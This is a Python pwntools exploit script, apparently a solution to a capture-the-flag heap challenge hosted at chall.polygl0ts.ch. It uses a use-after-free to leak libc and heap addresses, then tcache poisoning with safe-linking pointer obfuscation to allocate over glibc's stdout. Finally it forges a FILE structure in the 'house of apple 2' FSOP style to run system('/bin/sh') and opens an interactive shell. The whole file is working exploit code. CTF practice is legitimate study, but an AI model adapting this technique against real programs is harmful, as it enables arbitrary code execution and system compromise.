import pwn
from pwn import *

# --- Configurazione ---
exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
context.binary = exe
context.log_level = 'info'
context.terminal = ["kitty", "-e"] 

HOST = "chall.polygl0ts.ch"
PORT = 6242

def start():
    if args.GDB:
        p = process(exe.path)
        subprocess.Popen(["kitty", "-e", "bash", "-lc", f"gdb -q -p {p.proc.pid}; exec bash"])
        return p
    elif args.LOCAL:
        return process("./chal_patched", env={"LD_PRELOAD": "./libc.so.6"})
    else:
        return remote(HOST, PORT)

p = start()

def alloc(idx, size, data):
    p.sendline(b"1")
    p.sendlineafter(b"idx?: ", str(idx).encode())
    p.sendlineafter(b"size?: ", str(size).encode())
    p.sendlineafter(b"data?: ", data)

def free(idx):
    p.sendline(b"3")
    p.sendlineafter(b"idx?: ", str(idx).encode())

def view(idx):
    p.sendline(b"2")
    p.sendlineafter(b"idx?: ", str(idx).encode())
    p.recvuntil(b"meow: ")
    return p.recvline(keepends=False)

def edit(idx, data):
    p.sendline(b"4")
    p.sendlineafter(b"idx?: ", str(idx).encode())
    p.sendlineafter(b"new data?: ", data)

def obfuscate(pos, ptr):
    return (pos >> 12) ^ ptr



# fsop, house of apple 2 https://corgi.rip/posts/leakless_heap_1/
def solve():
    alloc(0, 0x420, '')
    alloc(1, 0x118, '')
    free(1)
    free(0)
    leak = u64(view(0)[:8])
    libc.address = leak-0x211b20
    success("leak libc 0x%hx" % leak)
    
    leak = int(hex(u64(view(1)[:8]))+'000', 16)
    success("leak heap 0x%hx" % leak)

    edit(1, p64((libc.sym['_IO_2_1_stdout_']-0x20) ^ (leak>>12)))
    alloc(1, 0x118, '')
    # 0x118:
    # 0x20 padding until stdout +
    # 0xe0 FileStructure size +
    # 3 ptr da 8 byte = 0x118 ->  p64(libc.sym.system) + p64(0) + p64(libc.sym["_IO_2_1_stdout_"] + 0xe0 - 0x68)

    
    file = FileStructure()
    file.flags = 0x3b01010101010101
    file._IO_read_ptr = b"/bin/sh\0"
    file._lock =  libc.sym["_IO_2_1_stdout_"] + 0x200
    file._wide_data = libc.sym["_IO_2_1_stdout_"] + 0x10
    file.vtable = libc.sym["_IO_wfile_jumps"] - 0x20
    payload = b'\x00'*0x20 + bytes(file) + p64(libc.sym.system) + p64(0) + p64(libc.sym["_IO_2_1_stdout_"] + 0xe0 - 0x68)
    print(len(payload))
    alloc(1, 0x118, payload)
    p.interactive()

if __name__ == "__main__":
    try:
        solve()
    except Exception as e:
        log.error(str(e))
